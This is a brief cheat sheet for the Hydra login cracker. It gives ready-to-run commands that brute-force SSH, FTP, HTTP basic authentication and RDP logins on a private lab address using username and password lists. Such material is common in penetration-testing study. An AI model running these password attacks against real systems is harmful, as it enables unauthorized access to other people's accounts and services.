 Hydra  is a parallelized login cracker which supports numerous protocols to attack. New modules are easy to add, beside that, it is flexible and very fast.

**Note: ** Look into the man page for more options.

**Syntax:**
**Brute Force SSH**
	`hydra -L usernames.txt -P passwords.txt ssh://192.168.1.100`

**Dictionary Attack on FTP**
	`hydra -l admin -P passwords.txt ftp://192.168.1.100`

**Attack HTTP Basic Authentication**
	`hydra -L usernames.txt -P passwords.txt 192.168.1.100 http-get /protected`

****Attack an RDP Service****
	`hydra -l user1 -P passwords.txt rdp://192.168.1.100`
